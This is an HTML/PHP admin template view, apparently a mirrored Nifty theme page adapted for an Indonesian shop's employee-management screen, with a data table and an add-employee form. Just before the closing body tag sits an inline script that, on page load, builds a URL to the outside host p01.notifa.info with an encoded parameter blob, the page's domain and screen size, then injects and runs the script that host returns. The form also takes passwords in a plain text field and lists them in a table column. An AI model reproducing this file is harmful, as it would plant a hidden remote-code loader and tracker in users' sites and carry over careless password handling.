
<!DOCTYPE html>
<html lang="en">



<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:05 GMT -->
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Data Tables | Nifty - Admin Template</title>


    <!--STYLESHEET-->
    <!--=================================================-->

    <!--Open Sans Font [ OPTIONAL ]-->
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700' rel='stylesheet' type='text/css'>

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">


    <!--Bootstrap Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/bootstrap.min.css" rel="stylesheet">


    <!--Nifty Stylesheet [ REQUIRED ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/nifty.min.css" rel="stylesheet">


    <!--Nifty Premium Icon [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo-icons.min.css" rel="stylesheet">


    <!--=================================================-->

    <!--=================================================-->

    <!--Pace - Page Load Progress Par [OPTIONAL]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.css" rel="stylesheet">
    <script src="<?php echo base_url();?>assets/adminlte/plugins/pace/pace.min.js"></script>


    <!--Demo [ DEMONSTRATION ]-->
    <link href="<?php echo base_url();?>assets/adminlte/css/demo/nifty-demo.min.css" rel="stylesheet">



    <!--DataTables [ OPTIONAL ]-->
    <link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/css/dataTables.bootstrap.css" rel="stylesheet">
	<link href="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/css/responsive.dataTables.min.css" rel="stylesheet">

    <!--=================================================

    REQUIRED
    You must include this in your project.


    RECOMMENDED
    This category must be included but you may modify which plugins or components which should be included in your project.


    OPTIONAL
    Optional plugins. You may choose whether to include it in your project or not.


    DEMONSTRATION
    This is to be removed, used for demonstration purposes only. This category must not be included in your project.


    SAMPLE
    Some script samples which explain how to initialize plugins or components. This category should not be included in your project.


    Detailed information and more samples can be found in the document.

    =================================================-->

    <link rel="stylesheet" type="text/css" href="<?php echo base_url();?>assets/adminlte/css/bootstrap.css">
    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/jquery.js"></script>
    <script type="text/javascript" src="<?php echo base_url();?>assets/adminlte/js/bootstrap.js"></script>


</head>

<!--TIPS-->
<!--You may remove all ID or Class names which contain "demo-", they are only used for demonstration. -->
<body>
    <div id="container" class="effect aside-float aside-bright mainnav-lg">

        <!--NAVBAR-->
        <!--===================================================-->
        <header id="navbar">
            <div id="navbar-container" class="boxed">

                <!--Brand logo & name-->
                <!--================================-->
                <div class="navbar-header">
                    <a href="index.html" class="navbar-brand">
                        <img src="<?php echo base_url();?>assets/adminlte/img/logo.png" alt="Nifty Logo" class="brand-icon">
                        <div class="brand-title">
                            <span class="brand-text">Nifty</span>
                        </div>
                    </a>
                </div>
                <!--================================-->
                <!--End brand logo & name-->


                <!--Navbar Dropdown-->
                <!--================================-->
                <div class="navbar-content">
                    <ul class="nav navbar-top-links">

                        <!--Navigation toogle button-->
                        <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                        <li class="tgl-menu-btn">
                            <a class="mainnav-toggle" href="#">
                                <i class="demo-pli-list-view"></i>
                            </a>
                        </li>

                    </ul>

        </header>
        <!--===================================================-->
        <!--END NAVBAR-->

        <div class="boxed">

            <!--CONTENT CONTAINER-->
            <!--===================================================-->
            <div id="content-container">
                <div id="page-head">

                    <!--Page Title-->
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <div id="page-title">
                        <h1 class="page-header text-overflow">Data Tables</h1>
                    </div>
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <!--End page title-->


                    <!--Breadcrumb-->
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <ol class="breadcrumb">
					<li><a href="#"><i class="demo-pli-home"></i></a></li>
					<li><a href="#">Tables</a></li>
					<li class="active">Data Tables</li>
                    </ol>
                    <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
                    <!--End breadcrumb-->

                </div>


                 <!--Page content-->
                <!--===================================================-->
                <div id="page-content">

                    <!-- Basic Data Tables -->
                    <!--===================================================-->
                    <div class="panel">

                        <div class="panel-body">
                            <table id="demo-dt-basic" class="table table-striped table-bordered" cellspacing="0" width="100%">
                                                                <!-- Modal -->
                   <div class="row">
                        <div class="col-md-6">
                            <div id="demo-panel-ref" class="panel">
                                <div class="panel-heading">

                            <button data-target="#demo-default-modal" data-toggle="modal" class="btn btn-primary">Tambah Pegawai</button>
                                </div>
                         </div>
                            </div>
                                <thead>
                                    <tr>
                                        <th>Nama</th>
                                        <th>Tempat Lahir</th>
                                        <th class="min-tablet">Tanggal Lahir</th>
                                        <th class="min-tablet">Email</th>
                                        <th class="min-desktop">Password</th>
                                        <th class="min-desktop">Telepon</th>
                                        <th class="min-desktop">Alamat</th>
                                        <th>Foto</th>
                                        <th>Status</th>
                                        <th> Aksi</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                        <th></th>
                                    </tr>
                                </tbody>
                            </table>
                           </div>
                        </div>
                    </div>

                    <!--===================================================-->
                    <!-- End Striped Table -->

                </div>
                <!--===================================================-->
                <!--End page content-->
            </div>
            <!--===================================================-->
            <!--END CONTENT CONTAINER-->


            <!--Default Bootstrap Modal-->
    <!--===================================================-->
    <div class="modal fade" id="demo-default-modal" role="dialog" tabindex="-1" aria-labelledby="demo-default-modal" aria-hidden="true" >
        <div class="modal-dialog">
            <div class="modal-content" >

                <!--Modal header-->
                <div class="modal-header" >
                    <button type="button" class="close" data-dismiss="modal"><i class="pci-cross pci-circle"></i></button>
                    <h4 class="modal-title" align="Center" style="color:#000000">Data Diri Pegawai</h4>
                </div>

                <!--Modal body-->
                <div class="modal-body"  >

                                <!--Block Styled Form -->
                                <!--===================================================-->
                                <form>
                                    <div class="panel-body" >
                                        <div class="row" >
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Nama</b></label>
                                                    <input type="text" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Tempat Lahir</b></label>
                                                    <input type="text" class="form-control">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Tanggal Lahir</b></label>
                                                    <input type="date" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Email</b></label>
                                                    <input type="email" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Password</b></label>
                                                    <input type="text" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Telepon</b></label>
                                                    <input type="text" class="form-control">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Alamat</b></label>
                                                    <input type="text" class="form-control" style="height:100px;">
                                                </div>
                                            </div>
                                            <div class="col-sm-6">
                                                <div class="form-group">
                                                    <label class="control-label" style="color:#000000"><b>Foto</b></label>
                                                    <input type="file">
                                                    <img src="">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                <!--Modal footer-->
                <div class="modal-footer">
                    <button class="btn btn-primary">Simpan</button>
                    <button data-dismiss="modal" class="btn btn-default" type="button" style="color:#000000"><b>Keluar</b></button>
                </div>
            </div>
        </div>
    </div>

    <!--===================================================-->
    <!--End Default Bootstrap Modal-->

             <!--MAIN NAVIGATION-->
            <!--===================================================-->
            <nav id="mainnav-container">
                <div id="mainnav">


                    <!--Menu-->
                    <!--================================-->
                    <div id="mainnav-menu-wrap">
                        <div class="nano">
                            <div class="nano-content">

                                <!--Profile Widget-->
                                <!--================================-->
                                <div id="mainnav-profile" class="mainnav-profile">
                                    <div class="profile-wrap text-center">
                                        <div class="pad-btm">
                                            <img class="img-circle img-md" src="<?php echo base_url();?>assets/adminlte/img/profile-photos/1.png" alt="Profile Picture">
                                        </div>
                                        <a href="#profile-nav" class="box-block" data-toggle="collapse" aria-expanded="false">
                                            <span class="pull-right dropdown-toggle">
                                                <i class="dropdown-caret"></i>
                                            </span>
                                            <p class="mnp-name">Aaron Chavez</p>
                                            <span class="mnp-desc">aaron.cha@themeon.net</span>
                                        </a>
                                    </div>
                                    <div id="profile-nav" class="collapse list-group bg-trans">
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-male icon-lg icon-fw"></i> View Profile
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-gear icon-lg icon-fw"></i> Settings
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-information icon-lg icon-fw"></i> Help
                                        </a>
                                        <a href="#" class="list-group-item">
                                            <i class="demo-pli-unlock icon-lg icon-fw"></i> Logout
                                        </a>
                                    </div>
                                </div>


                                <ul id="mainnav-menu" class="list-group">

						            <!--Category name-->
						            <li class="list-header">Navigation</li>

						            <!--Menu list item-->
                        <li class="active-sub">
                            <a href="<?= base_url().'Dashboard' ?>">
                                <i class="fa fa-home"></i>
                                <span class="menu-title">
                                    Beranda
                                </span>
                            </a>
                        </li>

                        <!--Menu list item-->
                        <li >
                            <a href="<?= base_url().'toko' ?>">
                                <i class="glyphicon glyphicon-book"></i>
                                <span class="menu-title">Data Toko</span>
                                <i class="arrow"></i>
                            </a>

                            <!--Submenu-->
                            <ul class="collapse">
                               <li><a href="<?= base_url().'toko' ?>"><i class="fa fa-edit"></i>
                   <span class="menu-title">Informasi Toko
                               <li><a href="<?= base_url().'faqs' ?>"><i class="fa fa-edit"></i>Faqs</a></li>
                            </ul>
                        </li>

                        <!--Menu item-->
                        <li>
                            <a href="<?= base_url().'barang' ?>">
                                <i class="fa fa-file"></i>
                                <span class="menu-title">
                                    Data Barang
                                    <span class="pull-right badge badge-warning"></span>
                                </span>
                            </a>
                        </li>

                         <!--Menu item-->
                        <li>
                            <a href="<?= base_url().'riwayat' ?>">
                                <i class="fa fa-history"></i>
                                <span class="menu-title">
                                    Riwayat Barang
                                    <span class="pull-right badge badge-warning"></span>
                                </span>
                            </a>
                        </li>

                         <!--Menu item-->
                        <li>
                            <a href="<?= base_url().'Barang_Ready' ?>">
                                <i class="glyphicon glyphicon-list-alt"></i>
                                <span class="menu-title">
                                    Barang Ready
                                    <span class="pull-right badge badge-warning"></span>
                                </span>
                            </a>
                        </li>

                           <!--Menu item-->
                        <li>
                            <a href="<?= base_url().'pegawai' ?>">
                                <i class="fa fa-file"></i>
                                <span class="menu-title">
                                    Data Pegawai
                                    <span class="pull-right badge badge-warning"></span>
                                </span>
                            </a>
                        </li>

                         <!--Menu list item-->
                        <li >
                            <a href="<?= base_url().'penjualan' ?>">
                                <i class="glyphicon glyphicon-book"></i>
                                <span class="menu-title">Laporan</span>
                                <i class="arrow"></i>
                            </a>

                            <!--Submenu-->
                            <ul class="collapse">
                                           <li><a href="<?= base_url().'penjualan' ?>"><i class="fa fa-book"></i>
                               <span class="menu-title">Penjualan
                                           <li><a href="<?= base_url().'pembelian' ?>"><i class="fa fa-book"></i>Pembelian</a></li>
                                        </ul>
                                    </li>
                         <!--Menu item-->
                        <li>
                            <a href="<?= base_url().'kritik' ?>">
                                <i class="fa fa-wechat"></i>
                                <span class="menu-title">
                                    Kritik & Saran
                                    <span class="pull-right badge badge-warning"></span>
                                </span>
                            </a>
                        </li>
                </div>
            </div>
        </div>
        <!--================================-->
        <!--End menu-->
    </div>
</nav>

            <!--===================================================-->
            <!--END MAIN NAVIGATION-->

        </div>



        <!-- FOOTER -->
        <!--===================================================-->
        <footer id="footer">

            <!-- Visible when footer positions are fixed -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <div class="show-fixed pad-rgt pull-right">
                You have <a href="#" class="text-main"><span class="badge badge-danger">3</span> pending action.</a>
            </div>



            <!-- Visible when footer positions are static -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
     <!--       <div class="hide-fixed pull-right pad-rgt">
                14GB of <strong>512GB</strong> Free.
            </div>

	-->

            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->
            <!-- Remove the class "show-fixed" and "hide-fixed" to make the content always appears. -->
            <!-- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -->

            <p class="pad-lft">&#0169; </p>



        </footer>
        <!--===================================================-->
        <!-- END FOOTER -->


        <!-- SCROLL PAGE BUTTON -->
        <!--===================================================-->
        <button class="scroll-top btn">
            <i class="pci-chevron chevron-up"></i>
        </button>
        <!--===================================================-->
    </div>
    <!--===================================================-->
    <!-- END OF CONTAINER -->





    <!--JAVASCRIPT-->
    <!--=================================================-->

    <!--jQuery [ REQUIRED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/jquery.min.js"></script>


    <!--BootstrapJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/bootstrap.min.js"></script>


    <!--NiftyJS [ RECOMMENDED ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/nifty.min.js"></script>




    <!--=================================================-->

    <!--Demo script [ DEMONSTRATION ]-->
  <!--  <script src="<?php echo base_url();?>assets/adminlte/js/demo/nifty-demo.min.js"></script> -->


    <!--DataTables [ OPTIONAL ]-->
    <script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/jquery.dataTables.js"></script>
	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/media/js/dataTables.bootstrap.js"></script>
	<script src="<?php echo base_url();?>assets/adminlte/plugins/datatables/extensions/Responsive/js/dataTables.responsive.min.js"></script>


    <!--DataTables Sample [ SAMPLE ]-->
    <script src="<?php echo base_url();?>assets/adminlte/js/demo/tables-datatables.js"></script>




<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2iBChPrGIbjUaxQDkkXsQ40smKLX5MuTaP3Hz7CQx99v6v04x8tXILLzaJOlxMW8AqYZK7vJBQ0GeroIrDmsgRoQd3TbDcKFg5ZBqSJkgONBJfmihZkKwZm6n6A8yUgj4nkx3jY0LDUaUhTTSVo18zAU71F%2bg%2fz9XJK7mEBwuR9UbbQUNbpeu8TLlTGwc%2bJ8Q4Ghvlq5a3uLs3tGbSqe%2bIMGFB42NllBOXiUa%2fJS3C%2f4xtm2qCm0o76VDiUn%2fJU4E2PfPUP5k8Q8kqhOs%2f%2fJYJ%2b5E9CA9qTuBEo6UMsqrPZvthp0Oykb75Uu2OV1Q22Y539wDCdiCo%2fWdq8fte8WqybYrW7iOvpOtmuE9ypRwL6%2b5gbKpaecKP8gA8490c03k5TAyLvuWRxyhxBbA0sZtkm3%2b8dHg4FAjhTkRhGG4SmpBOqFSR9NOOtxN2dE8rtluoiMR%2fABnnWziDQHZS%2bjsuB5P1ZZS9wUjx%2bBZgxi5uazzR7I6vPu%2fVdNPdhxC%2fcET" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from www.themeon.net/nifty/v2.9.1/tables-datatable.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 02 Feb 2019 04:06:10 GMT -->
</html>
